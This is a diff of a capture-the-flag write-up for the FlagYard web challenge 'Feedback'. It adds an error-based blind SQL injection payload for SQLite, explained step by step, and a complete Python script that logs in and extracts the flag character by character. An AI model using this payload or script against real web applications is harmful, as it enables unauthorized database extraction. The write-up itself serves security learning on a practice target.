@@ -1,6 +1,6 @@
 ---
 title: FlagYard - Web - Feedback
-date: '2016-03-08'
+date: '2024-10-17'
 tags: ['SQL injection', 'Blind SQL', 'WEB', 'Expoitation']
 draft: false
 summary: Retrieving data from SQLite3 database by exploiting Blind SQl injection in Web Application
@@ -208,15 +208,86 @@ SELECT CASE
 END;
 ```
 
-We will use a conditional error like (1/0), which will trigger an error and help us distinguish between true and false. The idea is to check each character of the flag with our input using substr() and cause an error based on the comparison.
+We can't use `sleep()` because it is not available in sqlite. We will use a conditional error like (1/0), which will trigger an error and help us distinguish between true and false. The idea is to check each character of the flag with our input using substr() and cause an error based on the comparison.
 
 Let's first confirm whether this approach works. I will test the following queries:
 
 `' OR (1/1) AND '1` – This should display "Thanks for the feedback."
 `' OR (1/0) AND '1` – This should display "Something went wrong."
 
-Yes. It works. Now lets create our basic payload for final testing.
+Great! Since it works, let's create our basic payload for final testing:
 
 ```
 ' OR CASE WHEN SUBSTR((SELECT flag FROM flag),1,1)='F' THEN 1 ELSE (1/0) END AND '1
 ```
+
+### Explanation:
+- `' OR` – Breaks out of the current query and starts our injected logic.
+- `CASE WHEN SUBSTR((SELECT flag FROM flag),1,1)='F'` – Checks if the first character of the flag is 'F'.
+- `THEN 1` – If the condition is true, it returns 1 (no error).
+- `ELSE (1/0)` – If the condition is false, it causes an error by dividing by zero.
+- `END AND '1` – Ends the case statement and ensures the query is valid.
+### Expected Results:
+- If the first character is `F`, we should see `Thanks for the feedback.`
+- If it’s not, we’ll get `Something went wrong.`
+
+This payload is working perfectly. Now, let's create a Python script to automate the process.
+
+```
+import requests
+import string
+
+#Replace the instance URL
+base_url = "Your_Instance_URL"
+login_url = base_url + "/login"
+add_note_url = base_url
+
+
+charset = string.digits + string.ascii_letters + "{}_"
+flag = ""
+position = 1
+
+#Replace the Credentials
+username = "your_username"  
+password = "your_password" 
+
+session = requests.Session()
+
+def login():
+    login_data = {"username": username, "password": password}
+    response = session.post(login_url, data=login_data)
+    if "Welcome" in response.text:
+        print("[+] Login successful!")
+    else:
+        print("[-] Login failed.")
+        exit()
+
+def test_char_for_position(char, position):
+    payload = f"' OR CASE WHEN SUBSTR((SELECT flag FROM flag),{position},1)='{char}' THEN 1 ELSE (1/0) END AND '1"
+    data = {"feedback": payload}
+    response = session.post(add_note_url, data=data)
+
+    if "Thanks for the feedback" in response.text:
+        return True
+    return False
+
+
+login()
+
+while True:
+    for char in charset:
+        print(f"[+] {flag}{char}")
+        if test_char_for_position(char, position):
+            flag += char
+            position += 1
+            break
+
+    if flag[::-1][0] == "}":
+        break
+    
+
+print(f"\n[+] Extracted flag: {flag}")
+```
+
+The best part is that our payload didn’t consist of any blocked words, allowing it to work seamlessly. This challenge has greatly deepened my understanding of blind SQL injection, especially in crafting effective queries to extract information without direct visibility. It was a valuable learning experience, demonstrating how SQL injection can be exploited step by step.
+
